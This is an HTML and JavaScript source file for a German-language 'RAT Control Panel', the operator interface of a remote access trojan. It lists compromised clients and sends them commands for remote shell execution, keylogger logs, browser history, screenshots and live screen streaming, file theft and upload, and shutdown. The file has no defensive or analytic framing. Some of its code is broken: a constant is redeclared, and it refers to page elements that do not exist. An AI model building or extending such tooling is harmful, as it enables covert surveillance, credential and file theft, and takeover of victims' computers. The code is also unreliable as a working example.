<!DOCTYPE html>
<html lang="de">
  <head>
    <meta charset="UTF-8" />
    <title>RAT Control Panel from J&N</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          Helvetica, Arial, sans-serif;
        background-color: #121212;
        color: #e0e0e0;
        margin: 0;
        padding: 20px;
        display: flex;
        height: calc(100vh - 40px);
        gap: 20px;
      }
      .panel {
        background-color: #1e1e1e;
        border-radius: 8px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      }
      #client-panel {
        width: 250px;
        display: flex;
        flex-direction: column;
      }
      #main-panel {
        flex-grow: 1;
        display: flex;
        flex-direction: column;
      }
      h2 {
        margin-top: 0;
        border-bottom: 1px solid #333;
        padding-bottom: 10px;
      }
      #client-list {
        list-style-type: none;
        padding: 0;
        flex-grow: 1;
      }
      #client-list li {
        padding: 10px;
        border-radius: 5px;
        cursor: pointer;
        margin-bottom: 5px;
        border: 1px solid transparent;
      }
      #client-list li:hover {
        background-color: #333;
      }
      #client-list li.selected {
        background-color: #0d47a1;
        border-color: #42a5f5;
        font-weight: bold;
      }
      #output {
        flex-grow: 1;
        background-color: #000;
        border: 1px solid #333;
        border-radius: 5px;
        padding: 10px;
        font-family: "Courier New", Courier, monospace;
        white-space: pre-wrap;
        word-wrap: break-word;
        overflow-y: auto;
        margin-bottom: 10px;
      }
      #controls {
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
      }
      .quick-btn {
        background-color: #263238;
        color: #fff;
        border: 1px solid #333;
        padding: 8px 12px;
        border-radius: 5px;
        margin-right: 5px;
        font-size: 0.95em;
      }
      .quick-btn:hover {
        background-color: #37474f;
      }
      input[type="text"] {
        flex-grow: 1;
        background-color: #333;
        border: 1px solid #555;
        color: #e0e0e0;
        padding: 10px;
        border-radius: 5px;
      }
      button {
        background-color: #0d47a1;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 5px;
        cursor: pointer;
      }
      button:hover {
        background-color: #1565c0;
      }
      .log-entry {
        padding: 2px 0;
      }
      .log-info {
        color: #4caf50;
      }
      .log-error {
        color: #f44336;
      }
      .log-cmd {
        color: #2196f3;
      }
      #upload-input {
        display: none;
      }
      /* --- Discord-Style Command Suggestion --- */
      #command-suggest {
        position: absolute;
        background: #23272a;
        color: #fff;
        border-radius: 6px;
        box-shadow: 0 4px 16px #000a;
        min-width: 220px;
        max-width: 350px;
        z-index: 1000;
        margin-top: 2px;
        padding: 4px 0;
        font-size: 1em;
        display: none;
      }
      #command-suggest .suggest-item {
        padding: 8px 16px;
        cursor: pointer;
        display: flex;
        align-items: center;
      }
      #command-suggest .suggest-item.selected,
      #command-suggest .suggest-item:hover {
        background: #5865f2;
        color: #fff;
      }
      #command-suggest .suggest-desc {
        color: #b9bbbe;
        font-size: 0.95em;
        margin-left: 10px;
        flex: 1;
      }
      @media (max-width: 900px) {
        body {
          flex-direction: column;
          height: auto;
        }
        #client-panel {
          width: 100%;
          margin-bottom: 10px;
        }
        #main-panel {
          width: 100%;
        }
      }
    </style>
  </head>
  <body>
    <div id="client-panel" class="panel">
      <h2>Clients</h2>
      <ul id="client-list"></ul>
    </div>

    <div id="main-panel" class="panel">
      <div id="output"></div>
      <div id="controls" style="position:relative;">
        <input
          type="text"
          id="command-input"
          placeholder="Befehle: exec, screenshot, download, history, keylogger, ls, systeminfo"
          autocomplete="off"
        />
        <div id="command-suggest"></div>
        <button id="send-button">Senden</button>
        <button class="quick-btn" id="btn-systeminfo" title="Systeminfo">Systeminfo</button>
        <button class="quick-btn" id="btn-ls" title="Verzeichnis auflisten">ls</button>
        <button class="quick-btn" id="btn-upload" title="Datei hochladen">Upload</button>
        <button class="quick-btn" id="btn-shutdown" title="Herunterfahren">Shutdown</button>
        <button class="quick-btn" id="btn-restart" title="Neustart">Restart</button>
        <button class="quick-btn" id="btn-screenstream-start" title="Live-Screen starten">Screenstream Start</button>
        <button class="quick-btn" id="btn-screenstream-stop" title="Live-Screen stoppen">Screenstream Stop</button>
        <input type="file" id="upload-input" />
      </div>
    </div>

    <script>
      const ws = new WebSocket(`wss://${window.location.host}/ws`);
      const clientList = document.getElementById("client-list");
      const output = document.getElementById("output");
      const commandInput = document.getElementById("command-input");
      const sendButton = document.getElementById("send-button");
      const uploadInput = document.getElementById("upload-input");
      const btnSysteminfo = document.getElementById("btn-systeminfo");
      const btnLs = document.getElementById("btn-ls");
      const btnUpload = document.getElementById("btn-upload");
      const btnShutdown = document.getElementById("btn-shutdown");
      const btnRestart = document.getElementById("btn-restart");
      const btnScreenStart = document.getElementById("btn-screenstream-start");
      const btnScreenStop = document.getElementById("btn-screenstream-stop");
      const screenImg = document.getElementById('screen');
      const screenStatus = document.getElementById('screen-status');

      let selectedClientId = null;
      let selectedClient = null;

      // --- UI Hilfsfunktionen ---
      function log(message, type = "info") {
        const entry = document.createElement("div");
        entry.className = `log-entry log-${type}`;
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        output.appendChild(entry);
        output.scrollTop = output.scrollHeight;
      }

      function triggerDownload(filename, base64Data) {
        const link = document.createElement("a");
        link.href = `data:application/octet-stream;base64,${base64Data}`;
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }

      // --- Client-Listenfunktionen ---
      function createClientListItem(client) {
        const li = document.createElement("li");
        li.textContent = `${client.hostname || "Unbekannt"} (${client.ip || client.address[0]})`;
        li.dataset.clientId = client.id;
        li.title = `Hostname: ${client.hostname || "?"}\nOS: ${client.os || "?"}\nIP: ${client.ip || client.address[0]}`;
        if (client.id === selectedClientId) {
          li.classList.add("selected");
        }
        li.addEventListener("click", () => selectClient(client.id, client));
        return li;
      }

      function renderClientList(clients) {
        clientList.innerHTML = "";
        clients.forEach((client) => {
          const li = createClientListItem(client);
          clientList.appendChild(li);
        });
      }

      function selectClient(id, clientObj) {
        selectedClientId = id;
        selectedClient = id;
        document.querySelectorAll("#client-list li").forEach((el) => el.classList.remove("selected"));
        const li = clientList.querySelector(`li[data-client-id='${id}']`);
        if (li) li.classList.add("selected");
        log(`Client ${clientObj?.hostname || id} ausgewählt.`, "cmd");
        screenImg.src = '';
        screenStatus.textContent = '';
      }

      // --- Discord-Style Command Suggestion ---
      const commandInput = document.getElementById("command-input");
      const commandSuggest = document.getElementById("command-suggest");

      // Liste der verfügbaren Befehle
      const COMMANDS = [
        { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
        { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
        { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
        { cmd: "/upload", desc: "Datei zum Client hochladen" },
        { cmd: "/history", desc: "Browserverlauf anzeigen" },
        { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
        { cmd: "/ls", desc: "Verzeichnis auflisten" },
        { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
        { cmd: "/shutdown", desc: "Client herunterfahren" },
        { cmd: "/restart", desc: "Client neustarten" },
        { cmd: "/screenstream_start", desc: "Live-Screen starten" },
        { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
      ];

      let suggestActive = false;
      let suggestItems = [];
      let suggestIndex = 0;

      function showSuggest(filtered) {
        if (!filtered.length) {
          commandSuggest.style.display = "none";
          suggestActive = false;
          return;
        }
        commandSuggest.innerHTML = "";
        filtered.forEach((item, idx) => {
          const div = document.createElement("div");
          div.className = "suggest-item" + (idx === suggestIndex ? " selected" : "");
          div.innerHTML = `<span>${item.cmd}</span><span class="suggest-desc">${item.desc}</span>`;
          div.addEventListener("mousedown", (e) => {
            e.preventDefault();
            selectSuggest(idx, filtered);
          });
          commandSuggest.appendChild(div);
        });
        // Positionierung
        const rect = commandInput.getBoundingClientRect();
        commandSuggest.style.left = commandInput.offsetLeft + "px";
        commandSuggest.style.top = (commandInput.offsetTop + commandInput.offsetHeight) + "px";
        commandSuggest.style.width = commandInput.offsetWidth + "px";
        commandSuggest.style.display = "block";
        suggestActive = true;
      }

      function hideSuggest() {
        commandSuggest.style.display = "none";
        suggestActive = false;
      }

      function selectSuggest(idx, filtered) {
        const cmd = filtered[idx].cmd;
        commandInput.value = cmd + " ";
        hideSuggest();
        commandInput.focus();
      }

      commandInput.addEventListener("input", (e) => {
        const val = commandInput.value;
        if (val.startsWith("/")) {
          const filtered = COMMANDS.filter(c =>
            c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
          );
          suggestItems = filtered;
          suggestIndex = 0;
          showSuggest(filtered);
        } else {
          hideSuggest();
        }
      });

      commandInput.addEventListener("keydown", (e) => {
        if (!suggestActive) return;
        if (e.key === "ArrowDown") {
          suggestIndex = (suggestIndex + 1) % suggestItems.length;
          showSuggest(suggestItems);
          e.preventDefault();
        } else if (e.key === "ArrowUp") {
          suggestIndex = (suggestIndex - 1 + suggestItems.length) % suggestItems.length;
          showSuggest(suggestItems);
          e.preventDefault();
        } else if (e.key === "Enter") {
          if (suggestActive && suggestItems.length) {
            selectSuggest(suggestIndex, suggestItems);
            e.preventDefault();
          }
        } else if (e.key === "Escape") {
          hideSuggest();
        }
      });

      commandInput.addEventListener("blur", () => {
        setTimeout(hideSuggest, 100); // Verzögert, damit Klick auf Vorschlag funktioniert
      });

      // --- Mapping für /-Befehle zu echten Aktionen ---
      function parseSlashCommand(val) {
        if (!val.startsWith("/")) return null;
        const [cmd, ...args] = val.trim().split(" ");
        switch (cmd) {
          case "/exec":
            return { action: "exec", command: args.join(" ") };
          case "/screenshot":
            return { action: "screenshot" };
          case "/download":
            return { action: "download", path: args.join(" ") };
          case "/upload":
            // handled by upload button
            return null;
          case "/history":
            return { action: "history", limit: parseInt(args[0]) || 20 };
          case "/keylogger":
            return { action: "keylogger", count: parseInt(args[0]) || 50 };
          case "/ls":
            return { action: "ls", path: args.join(" ") || "." };
          case "/systeminfo":
            return { action: "systeminfo" };
          case "/shutdown":
            return { action: "shutdown" };
          case "/restart":
            return { action: "restart" };
          case "/screenstream_start":
            return { action: "screenstream_start" };
          case "/screenstream_stop":
            return { action: "screenstream_stop" };
          default:
            return null;
        }
      }

      // --- Befehl senden (angepasst für /-Befehle) ---
      function sendCommand(customPayload = null) {
        if (!selectedClientId) {
          log("Fehler: Kein Client ausgewählt.", "error");
          return;
        }
        let payload;
        if (customPayload) {
          payload = { target_id: selectedClientId, ...customPayload };
        } else {
          const commandText = commandInput.value.trim();
          // Discord-Style: /-Befehle parsen
          let slashPayload = parseSlashCommand(commandText);
          if (slashPayload) {
            payload = { target_id: selectedClientId, ...slashPayload };
          } else {
            if (!commandText) return;
            const parts = commandText.split(" ");
            const action = parts[0].toLowerCase();
            const argument = parts.slice(1).join(" ");
            payload = {
              target_id: selectedClientId,
              action: action,
            };
            switch (action) {
              case "exec":
                payload.command = argument;
                break;
              case "download":
                payload.path = argument;
                break;
              case "history":
                payload.limit = parseInt(argument) || 20;
                break;
              case "keylogger":
                payload.count = parseInt(argument) || 50;
                break;
              case "ls":
                payload.path = argument || ".";
                break;
              case "screenshot":
              case "systeminfo":
              case "shutdown":
              case "restart":
                break;
              default:
                log(
                  "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
                  "error"
                );
                return;
            }
          }
        }
        ws.send(JSON.stringify(payload));
        log(
          `Befehl gesendet: ${payload.action}${
            payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
          }`,
          "cmd"
        );
        commandInput.value = "";
        hideSuggest();
      }

      // --- Event-Handler ---
      sendButton.addEventListener("click", sendCommand);
      commandInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") sendCommand();
      });
      btnSysteminfo.onclick = () => sendCommand({ action: "systeminfo" });
      btnLs.onclick = () => {
        const dir = prompt("Verzeichnis auflisten (leer für aktuelles):", ".");
        sendCommand({ action: "ls", path: dir || "." });
      };
      btnShutdown.onclick = () => {
        if (confirm("Client wirklich herunterfahren?")) sendCommand({ action: "shutdown" });
      };
      btnRestart.onclick = () => {
        if (confirm("Client wirklich neustarten?")) sendCommand({ action: "restart" });
      };
      btnUpload.onclick = () => uploadInput.click();
      uploadInput.onchange = () => {
        if (!selectedClientId) {
          log("Kein Client ausgewählt.", "error");
          return;
        }
        const file = uploadInput.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = function (e) {
          const dataB64 = btoa(
            new Uint8Array(e.target.result)
              .reduce((data, byte) => data + String.fromCharCode(byte), "")
          );
          ws.send(
            JSON.stringify({
              target_id: selectedClientId,
              action: "upload",
              filename: file.name,
              data: dataB64,
            })
          );
          log(`Datei-Upload gesendet: ${file.name}`, "cmd");
        };
        reader.readAsArrayBuffer(file);
      };

      btnScreenStart.onclick = () => {
        if (!selectedClient) {
          screenStatus.textContent = 'Kein Client ausgewählt!';
          return;
        }
        ws.send(JSON.stringify({action:'screenstream_start',client_id:selectedClient}));
        screenStatus.textContent = 'Live-Screen wird angefordert...';
      };
      btnScreenStop.onclick = () => {
        if (!selectedClient) {
          screenStatus.textContent = 'Kein Client ausgewählt!';
          return;
        }
        ws.send(JSON.stringify({action:'screenstream_stop',client_id:selectedClient}));
        screenStatus.textContent = 'Live-Screen gestoppt.';
        screenImg.src = '';
      };

      // --- WebSocket Events ---
      ws.onopen = () => log("Verbunden mit dem Control Server.");
      ws.onclose = () => log("Verbindung zum Control Server verloren.", "error");
      ws.onerror = (err) => log(`WebSocket Fehler: ${err}`, "error");

      ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        switch (data.type) {
          case "client_list":
            renderClientList(data.clients);
            break;
          case "client_connected":
            log(
              `Neuer Client verbunden: ${data.client.hostname || data.client.id} (${data.client.ip || data.client.address[0]})`
            );
            renderClientList([...clientList.querySelectorAll('li')].map(li => ({
              id: Number(li.dataset.clientId)
            })).concat([data.client]));
            break;
          case "client_disconnected":
            log(
              `Client ${data.client_id} hat die Verbindung getrennt.`,
              "error"
            );
            renderClientList([...clientList.querySelectorAll('li')].filter(li => Number(li.dataset.clientId) !== data.client_id).map(li => ({
              id: Number(li.dataset.clientId)
            })));
            if (selectedClientId === data.client_id) selectedClientId = null;
            break;
          case "command_output":
            log(
              `[Client ${data.client_id || selectedClientId}] Ausgabe:\n${data.output}`
            );
            break;
          case "screenshot":
            log(`[Client ${data.client_id}] Screenshot empfangen.`);
            const img = document.createElement("img");
            img.src = `data:image/png;base64,${data.data}`;
            img.style.maxWidth = "100%";
            img.style.marginTop = "10px";
            img.style.border = "1px solid #555";
            img.style.cursor = "pointer";
            img.title = "Klicken zum Vergrößern";
            img.onclick = () => {
              const w = window.open();
              w.document.write(`<img src="${img.src}" style="width:100%">`);
            };
            output.appendChild(img);
            output.scrollTop = output.scrollHeight;
            break;
          case "file_download":
            log(
              `[Client ${data.client_id}] Datei '${data.filename}' empfangen. Download wird gestartet.`
            );
            triggerDownload(data.filename, data.data);
            break;
          case "error":
            log(`[Server/Client Fehler] ${data.message || data.error}`, "error");
            break;
        }
        // Live-Screen-Frame
        if (data.action === 'screen_frame' && data.client_id === selectedClient) {
          screenImg.src = 'data:image/jpeg;base64,' + data.data;
          screenStatus.textContent = 'Livebild empfangen';
        }
      };
    </script>
  </body>
</html>